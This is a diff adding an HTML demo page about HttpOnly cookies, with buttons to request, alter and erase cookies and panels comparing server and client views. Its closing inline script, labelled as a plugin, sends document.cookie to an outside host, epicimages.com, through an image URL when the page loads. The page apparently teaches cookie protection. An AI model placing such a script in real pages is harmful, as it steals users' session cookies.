@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Today's Cookies are HttpOnly ;)</title>
+    <script src="index.js"></script>
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png" />
+    <link rel="manifest" href="manifest.json" />
+  </head>
+
+  <body id="body">
+    <h1 id="the-secret"></h1>
+    <button id="request-cookie">Request Cookie from server</button>
+    <br />
+    <button id="request-http-only-cookie">Request HttpOnly Cookie from server</button>
+    <br />
+    <button id="hack-local-cookie">Hack Cookie</button>
+    <button id="erase-local-cookie">Erase Cookie</button>
+    <br />
+    <h2>Server sees:</h2>
+    <textarea id="cookies-read-by-server" style="width: 375px; height: 113px"></textarea>
+    <h2>Client sees:</h2>
+    <textarea id="cookies-read-by-client" style="width: 375px; height: 113px"></textarea>
+    <br />
+    <br />
+    <h1>Awesome plugin from epicimages.com</h1>
+  </body>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function (event) {
+      var img = document.createElement("img");
+      img.src = `http://epicimages.com:3000/arnold.jpg?cookie=${escape(document.cookie)}`;
+      document.getElementById("body").appendChild(img);
+    });
+  </script>
+</html>
